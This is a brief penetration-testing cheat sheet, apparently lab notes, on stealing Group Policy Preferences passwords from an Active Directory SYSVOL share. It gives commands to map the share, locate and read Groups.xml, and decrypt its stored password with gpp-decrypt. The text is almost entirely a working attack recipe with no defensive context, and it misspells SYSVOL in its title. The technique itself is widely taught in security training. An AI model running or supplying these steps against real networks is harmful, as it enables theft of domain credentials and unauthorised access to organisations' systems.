# Attack AD Sysol Share to Get GPP Password

```
net use z: \\$TARGET\sysvol
Z:\>dir /s Groups.xml 
copy Z:\megacorpone.com\Policies\{...}\Machine\Preferences\Groups\Groups.xml
type groups.xml
gpp-decrypt $HASH
```
